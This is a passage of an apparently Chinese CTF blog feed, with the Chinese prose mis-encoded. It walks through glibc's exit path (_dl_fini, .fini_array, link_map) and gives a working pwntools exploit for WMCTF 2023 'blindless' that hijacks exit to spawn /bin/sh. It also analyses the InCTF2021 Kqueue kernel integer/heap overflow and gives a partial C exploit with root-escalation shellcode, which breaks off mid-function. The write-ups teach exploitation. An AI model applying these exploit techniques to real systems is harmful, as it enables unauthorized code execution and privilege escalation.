title="initial"><p>æ¥ä¸‹æ¥__run_exit_handlersä¼šéå†initialçš„fnsæ•°ç»„ï¼Œå½“flavor&#x3D;&#x3D;ef_cxaï¼ˆ4ï¼‰æ—¶ä¼šè§£å¯†f-&gt;func.cxa.fnæŒ‡é’ˆå¹¶è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå°±æ˜¯_dl_fini</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span></span><br><span class="hljs-class">&#123;</span><br>  ef_free,<span class="hljs-comment">/* `ef_free&#x27; MUST be zero!  */</span><br>  ef_us,<br>  ef_on,<br>  ef_at,<br>  ef_cxa<br>&#125;;<br></code></pre></td></tr></table></figure><p>psï¼šæˆ‘å½“æ—¶æƒ³è¿‡è¿™é‡Œèƒ½ä¸èƒ½åˆ©ç”¨ï¼Œä½†å‘ç°è¿™ä¸ªåŠ å¯†åå°±æ”¾å¼ƒäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">case</span> ef_cxa:<br>      <span class="hljs-comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span><br><span class="hljs-comment"> we must mark this function as ef_free.  */</span><br>      f-&gt;flavor = ef_free;<br>      cxafct = f-&gt;func.cxa.fn;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>      PTR_DEMANGLE (cxafct);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      cxafct (f-&gt;func.cxa.arg, status);<br>      <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåŠ å¯†çš„æ•°æ®æ¥è‡ªfs:[0x30]ï¼Œå’Œcanaryå·®ä¸å¤š</p></li><li><p>_dl_finiä¸­è°ƒç”¨_dl_rtld_lock_recursiveå’Œ_dl_rtld_unlock_recursiveçš„åœ°æ–¹å°±æ˜¯è¿™é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-comment">/* Protect against concurrent loads and unloads.  */</span><br>      __rtld_lock_lock_recursive (GL(dl_load_lock));<br><br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;<br>      <span class="hljs-comment">/* No need to do anything for empty namespaces or those used for</span><br><span class="hljs-comment"> auditing DSOs.  */</span><br>      <span class="hljs-keyword">if</span> (nloaded == <span class="hljs-number">0</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  )<br>__rtld_lock_unlock_recursive (GL(dl_load_lock));<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªåœ°å€è·³è½¬</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>((<span class="hljs-type">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ˜¯è°ƒç”¨.fini_arrayçš„åœ°æ–¹</p></li></ul><p>ç»†çœ‹ä¸€ä¸‹è°ƒç”¨è¿™ä¸ªåœ°å€è·³è½¬çš„è¿‡ç¨‹ï¼ˆlink_mapç»“æ„ä½“ä»‹ç»è§ret2dlresolveï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">maps</span>[<span class="hljs-title">nloaded</span>];</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>  assert (nloaded != <span class="hljs-number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * éå†_rtld_globalä¸­çš„æ‰€æœ‰link_mapï¼Œæ”¾å…¥maps</span><br><span class="hljs-comment"> * link_mapçš„éå†æ˜¯æŒ‰ç…§_rtld_global[i]-&gt;_ns_loadedæ¥çš„ï¼Œè¿™ä¸ªæˆå‘˜çš„ç±»å‹æ˜¯ä¸€ä¸ªlink_mapæŒ‡é’ˆ</span><br><span class="hljs-comment"> * struct rtld_global</span><br><span class="hljs-comment"> * &#123;</span><br><span class="hljs-comment"> *   EXTERN struct link_namespaces</span><br><span class="hljs-comment"> *   &#123;</span><br><span class="hljs-comment"> *     struct link_map *_ns_loaded;</span><br><span class="hljs-comment"> *     unsigned int _ns_nloaded;</span><br><span class="hljs-comment"> *     â€¦â€¦</span><br><span class="hljs-comment"> */</span><br>  <span class="hljs-keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="hljs-number">0</span>; l != <span class="hljs-literal">NULL</span>; l = l-&gt;l_next)<br>    <span class="hljs-keyword">if</span> (l == l-&gt;l_real)<br>      &#123;<br>assert (i &lt; nloaded);<br><br>maps[i] = l;<br>l-&gt;l_idx = i;<br>++i;<br>++l-&gt;l_direct_opencount;<br>      &#125;<br>  assert (ns != LM_ID_BASE || i == nloaded);<br>  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nmaps = i;<br><br><span class="hljs-comment">/* æ’åºmapsä¸­çš„ç»“æ„ */</span><br>  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),<br> <span class="hljs-literal">NULL</span>, <span class="hljs-literal">true</span>);<br>â€¦â€¦<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nmaps; ++i)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span> =</span> maps[i];<br><br>      <span class="hljs-keyword">if</span> (l-&gt;l_init_called)<br>&#123;<br>  <span class="hljs-comment">/* ç¡®ä¿åªèƒ½è°ƒç”¨ä¸€æ¬¡  */</span><br>  l-&gt;l_init_called = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* ç¡®ä¿.fini_arrayæ®µæˆ–finiå‡½æ•°æ®µæè¿°ç¬¦ä¸ä¸ºç©º */</span><br>  <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span><br>      || l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>              <br>     â€¦â€¦<br>                    <br>           <span class="hljs-comment">/* å¦‚æœ.fini_arrayæ®µä¸ä¸ºç©ºï¼Œåˆ™ä½¿ç”¨.fini_arrayçš„æŒ‡é’ˆè°ƒç”¨finiå‡½æ•° */</span><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span>)<br>&#123;<br>               <span class="hljs-comment">/* ä½¿ç”¨åŸºå€ï¼ˆl-&gt;l_addrï¼‰å’Œåç§»ï¼ˆd_un.d_ptrï¼‰è®¡ç®—.fini_arrayåœ°å€ */</span><br>  ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>    (ElfW(Addr) *) (l-&gt;l_addr<br>    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br>  <span class="hljs-comment">/* è®¡ç®—.fini_arrayæ®µå¤§å°ä¸”ä»¤å…¶=i */</span>                  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>    / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br>  <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">// è°ƒç”¨finiå‡½æ•°</span><br>    ((<span class="hljs-type">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();<br>&#125;<br>              <br>             <span class="hljs-comment">/* å¦‚æœ.fini_arrayæ®µä¸ºç©ºï¼Œåˆ™ç›´æ¥è°ƒç”¨finiå‡½æ•° */</span><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>DL_CALL_DT_FINI<br>  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);<br>    &#125;<br>              <br>â€¦â€¦<br></code></pre></td></tr></table></figure><h2 id="ä¾‹é¢˜ï¼šWMCTF-2023-blindless"><a href="#ä¾‹é¢˜ï¼šWMCTF-2023-blindless" class="headerlink" title="ä¾‹é¢˜ï¼šWMCTF - 2023 - blindless"></a>ä¾‹é¢˜ï¼šWMCTF - 2023 - blindless</h2><p>åˆ©ç”¨çš„å°±æ˜¯.fini_arrayæ®µä¸ºç©ºï¼Œåˆ™ç›´æ¥è°ƒç”¨finiå‡½æ•°çš„åˆ†æ”¯</p><p>æ ¹æ®hintï¼Œæˆ‘ä»¬å¯ä»¥ç”³è¯·ä¸€ä¸ªå¤§çš„data chunkï¼ˆå¤§äº0x100000ï¼‰ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨mmapåˆ†é…å †å—ï¼Œåˆ†é…çš„å †å—å°±åœ¨libcä¸‹æ–¹ï¼Œlibcå’Œldçš„ç›¸å¯¹åœ°å€æ˜¯å›ºå®šçš„ï¼Œå°±å¯ä»¥é€šè¿‡è¶Šç•Œå†™æ›´æ”¹</p><p>æˆ‘ä»¬å¯ä»¥æ›´æ”¹elfçš„link_mapï¼ˆåœ¨ldé‡Œï¼‰</p><ul><li>æ›´æ”¹_rtld_global._dl_load_lock.mutexä¸º&#x2F;bin&#x2F;sh</li><li>æ›´æ”¹l_addrä¸º.initå’Œsystemçš„pltçš„å·®å€¼</li><li>æ›´æ”¹l_info[DT_FINI]ä¸ºl_info[DT_INIT]çš„å€¼</li><li>æ›´æ”¹l_info[DT_FINI_ARRAY]çš„å€¼ä¸º0</li></ul><p><em><strong>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆæ„é€ ï¼Ÿ</strong></em></p><ul><li><p>.finiæ®µçš„åœ°å€æ˜¯0x1558ï¼Œbackdoorå’Œsystemçš„pltçš„åœ°å€éƒ½åœ¨å®ƒä¹‹ä¸‹ï¼Œä½†æ”¹l_addråªèƒ½å¾€åæ”¹ä¸èƒ½å¾€å‰æ”¹ï¼Œæ‰€ä»¥è¦ä½¿l_info[DT_FINI]æŒ‡å‘ä¸€ä¸ªé å‰çš„åœ°å€ï¼Œè¿™é‡Œæˆ‘é€‰åˆ™äº†l_info[DT_INIT]ï¼ˆ0x1000ï¼‰</p></li><li><p>ä½¿ç”¨system(â€˜&#x2F;bin&#x2F;shâ€™)è€Œä¸æ˜¯è°ƒç”¨backdooræ˜¯å› ä¸º</p><ul><li>systemçš„pltå’Œ.initçš„å·®å€¼ä¸º0xe0</li><li>backdoorå’Œ.initçš„å·®å€¼ä¸º0x209</li></ul><p>å¦‚æœè¦ä½¿ç”¨backdoorå°±è¦æ”¹ä¸¤å­—èŠ‚ï¼Œæ¶‰åŠä¸€ä¸ª1&#x2F;16çš„çˆ†ç ´ï¼Œå¯¹æˆ‘æ¥è¯´çˆ†ç ´èƒ½æ²¡æœ‰æœ€å¥½æ²¡æœ‰ï¼šï¼‰</p></li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">offset, value</span>):<br>    code = <span class="hljs-string">b&#x27;&#x27;</span><br>    code += <span class="hljs-string">b&#x27;@&#x27;</span><br>    code += p32(offset)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> value:<br>        code += <span class="hljs-string">b&#x27;.&#x27;</span><br>        code += p8(i)<br>        code += <span class="hljs-string">b&#x27;&gt;&#x27;</span><br>    <span class="hljs-keyword">return</span> code<br><br>p = process(<span class="hljs-string">&#x27;./main&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Pls input the data size\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x100000</span>).encode())<br>code = write(<span class="hljs-number">0x325958</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>code += write(<span class="hljs-number">0x326180</span>-<span class="hljs-number">0x325958</span>-<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\xe0&#x27;</span>)<br>code += write(<span class="hljs-number">0x326228</span>-<span class="hljs-number">0x326180</span>-<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x10&#x27;</span>)<br>code += write(<span class="hljs-number">0x326290</span>-<span class="hljs-number">0x326228</span>-<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>p.sendlineafter(<span class="hljs-string">b&#x27;Pls input the code size\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(code)+<span class="hljs-number">1</span>).encode())<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Pls input your code\n&#x27;</span>, code+<span class="hljs-string">b&#x27;q&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Stack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel Heap Heap-Overflow</title>
    <link href="/2023/08/20/kernel-heap-heap-overflow/"/>
    <url>/2023/08/20/kernel-heap-heap-overflow/</url>
    
    <content type="html"><![CDATA[<p>è¿™é¢˜çš„ä»£ç çœŸçš„æ˜¯â€¦â€¦ä¸€è¨€éš¾å°½(Ë‰â–½Ë‰ï¼›)â€¦</p><p>psï¼šè§£åŒ…è¦ç”¨root</p><span id="more"></span><h1 id="ä¾‹é¢˜ï¼šInCTF2021-Kqueue"><a href="#ä¾‹é¢˜ï¼šInCTF2021-Kqueue" class="headerlink" title="ä¾‹é¢˜ï¼šInCTF2021 - Kqueue"></a>ä¾‹é¢˜ï¼šInCTF2021 - Kqueue</h1><p>è¿™é¢˜çš„æ•°æ®ç»“æ„æœ‰ç‚¹å¤æ‚ï¼ˆä¸»è¦æ˜¯ä»£ç å†™çš„å¤ªæ¶å¿ƒäº†ï¼‰</p><h2 id="æ•°æ®ç»“æ„åˆ†æ"><a href="#æ•°æ®ç»“æ„åˆ†æ" class="headerlink" title="æ•°æ®ç»“æ„åˆ†æ"></a>æ•°æ®ç»“æ„åˆ†æ</h2><ul><li><p>create_kqueueç»“æŸçš„æ•°æ®ç»“æ„</p><img src="/2023/08/20/kernel-heap-heap-overflow/struc1.png" class title="struc1"></li><li><p>edit_kqueueï¼Œå†™request-&gt;data</p><ul><li>å¦‚æœrequest.entry_idx&#x3D;&#x3D;0ï¼Œåˆ™å†™å…¥queue-&gt;data</li><li>å¦åˆ™å¦‚æœrequest.entry_idx&#x3D;&#x3D;kqueue_entry-&gt;idxï¼Œå†™å…¥kqueue_entry-&gt;data</li></ul></li><li><p>save_kqueue_entriesåçš„æ•°æ®ç»“æ„</p><img src="/2023/08/20/kernel-heap-heap-overflow/struc2.png" class title="struc2"></li></ul><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä¸»è¦æ¼æ´æ˜¯å‡ºåœ¨è¿™é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span><br>ull space = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>    err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br></code></pre></td></tr></table></figure><p>å¦‚æœä½¿request.max_entries&#x3D;0xffffffffï¼Œåˆ™request.max_entries+1ä¼šæº¢å‡ºä¸º0ï¼Œæ£€æµ‹é€šè¿‡ä½†è¿˜æ˜¯æº¢å‡ºäº†</p><p>é¢˜å¤–è¯ï¼šå¦‚æœè¦æ£€æµ‹æº¢å‡ºé‚£ä¹ˆæ¯ä¸€æ­¥è®¡ç®—æ“ä½œéƒ½è¦æœ‰æ£€æµ‹ï¼Œä½†+1é‚£æ­¥æ²¡æœ‰ï¼Œæ‰€ä»¥å‡ºé—®é¢˜äº†</p><p>è¿˜æœ‰è¿™é¢˜æ‰€æœ‰çš„é”™è¯¯åˆ¤æ–­å…¶å®éƒ½æ˜¯æ— æ•ˆçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">err</span><span class="hljs-params">(<span class="hljs-type">char</span>* msg)</span>&#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;%s\n&quot;</span>,msg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è™½ç„¶erræœ‰è¿”å›å€¼ä½†è¿”å›å€¼å¹¶æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œæ‰€ä»¥æ‰€æœ‰çš„åˆ¤æ–­éƒ½ä¸ç”¨ç®¡ï¼ˆä»£ç å†™çš„çœŸæ˜¯ä¾æ‰˜ç­”è¾©O(âˆ©_âˆ©)Oï¼‰</p><p>å¦‚æœä½¿request.max_entries&#x3D;0xffffffffï¼Œåˆ™æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p><ul><li><p>create_kqueueç»“æŸï¼Œåªåˆ†é…äº†ä¸€ä¸ªqueueå¤§å°ä¸º0x18ï¼Œæ²¡æœ‰queue_entry</p><img src="/2023/08/20/kernel-heap-heap-overflow/struc3.png" class title="struc3"></li><li><p>edit_kqueueä»¤request.entry_idx&#x3D;&#x3D;0ï¼Œqueue-&gt;dataå†™å…¥æ•°æ®</p><img src="/2023/08/20/kernel-heap-heap-overflow/struc4.png" class title="struc4"></li><li><p>save_kqueue_entrieså°†queue-&gt;dataå†™å…¥kqueueï¼Œdata_sizeç”±requestå†³å®šï¼Œå› ä¸ºå¯ä»¥éšä¾¿æº¢å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªobjectï¼ˆå †å–·è¿‡ç¨‹ç•¥ï¼‰</p><img src="/2023/08/20/kernel-heap-heap-overflow/struc5.png" class title="struc5"></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>shellcodeå‡½æ•°æ˜¯åˆ©ç”¨æ ˆä¸Šçš„æ®‹ç•™æ•°æ®ï¼ˆå…¶å®æ˜¯startå‡½æ•°çš„è¿”å›åœ°å€ï¼‰è®¡ç®—prepare_kernel_credå’Œcommit_credsåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SAVE          0xB105BABE</span><br><br><span class="hljs-type">size_t</span> root_rip;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span><br>    <span class="hljs-type">uint16_t</span> idx;<br>    <span class="hljs-type">char</span> *data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> rq = &#123;<br>        .max_entries = max_entries,<br>        .data_size = data_size,<br>    &#125;;<br>    ioctl(fd, CREATE_KQUEUE, &amp;rq);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">uint16_t</span> entry_idx, <span class="hljs-type">uint16_t</span> queue_idx, <span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> rq = &#123;<br>        .entry_idx = entry_idx,<br>        .queue_idx = queue_idx,<br>        .data = data,<br>    &#125;;<br>    ioctl(fd, EDIT_KQUEUE, &amp;rq);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size, <span class="hljs-type">uint16_t</span> queue_idx)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> rq = &#123;<br>        .max_entries = max_entries,<br>        .data_size = data_size,<br>        .queue_idx = queue_idx,<br>    &#125;;<br>    ioctl(fd, SAVE, &amp;rq);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">shellcode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12, [rsp + 0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12, 0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12, 0x8c580;&quot;</span>  <span class="hljs-comment">// prepare_kernel_cred</span><br>        <span class="hljs-string">&quot;add r13, 0x8c140;&quot;</span>  <span class="hljs-comment">// commit_creds</span><br>        <span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br>    );<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    root_rip = (<span 